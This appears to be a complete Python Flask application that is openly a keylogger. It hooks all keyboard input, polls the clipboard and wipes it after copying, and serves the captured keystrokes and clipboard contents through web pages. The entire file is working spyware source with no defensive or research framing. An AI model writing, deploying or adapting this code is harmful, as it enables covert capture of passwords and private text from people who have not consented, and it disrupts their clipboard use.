from flask import Flask, render_template
import threading
import keyboard
import signal
import sys
import pyperclip
import time

app = Flask(__name__)

# Keylogger class to capture keystrokes and clipboard content
class Keylogger:
    def __init__(self):
        self.keystrokes = []
        self.clipboard_content = []
        self.running = True
        self.current_word = ''  # To store the current word being typed

    def start_logging(self):
        keyboard.on_press(self.on_key_press)
        keyboard.wait()  # Wait for a keyboard event indefinitely

    def on_key_press(self, event):
        key = event.name
        if key == 'space':
            if self.current_word:  # Check if current_word is not empty
                self.keystrokes.append(self.current_word)
            self.current_word = ''  # Reset the current word
        elif len(key) == 1:  # Filter out non-alphanumeric keys
            self.current_word += key
        else:
            # Capture all keys, including special keys, and add a special class to them
            self.keystrokes.append(f'<span class="special-key">{key}</span>') 

    def check_clipboard(self):
        prev_clipboard_content = None
        while self.running:
            new_clipboard_content = pyperclip.paste()
            if new_clipboard_content != prev_clipboard_content:
                self.clipboard_content.append(new_clipboard_content)
                prev_clipboard_content = new_clipboard_content
                # Clear the clipboard content
                pyperclip.copy('')
            # Sleep for a short duration to avoid excessive CPU usage
            time.sleep(0.1)



    def clear_keystrokes(self):
        self.keystrokes = []

# Create an instance of the Keylogger class
keylogger = Keylogger()

# Function to start the keylogger and clipboard monitor in separate threads
def start_keylogger():
    keylogger.start_logging()

def monitor_clipboard():
    keylogger.check_clipboard()

# Start the keylogger and clipboard monitor when the Flask application starts
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.start()

# Signal handler to clear keystrokes and clipboard content when application is terminated
def signal_handler(sig, frame):
    keylogger.clear_keystrokes()
    keylogger.running = False
    sys.exit(0)

# Register the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

# Route to display logged keystrokes
@app.route('/')
def logged_keystrokes():
    keystrokes = keylogger.keystrokes
    return render_template('logged_keystrokes.html', title='Logged Keystrokes', keystrokes=keystrokes)

# Route to display clipboard content
@app.route('/clipboard_content')
def clipboard_content():
    clipboard_content = keylogger.clipboard_content
    return render_template('clipboard.html', title='Clipboard Content', clipboard_content=clipboard_content)

if __name__ == '__main__':
    app.run(debug=True)




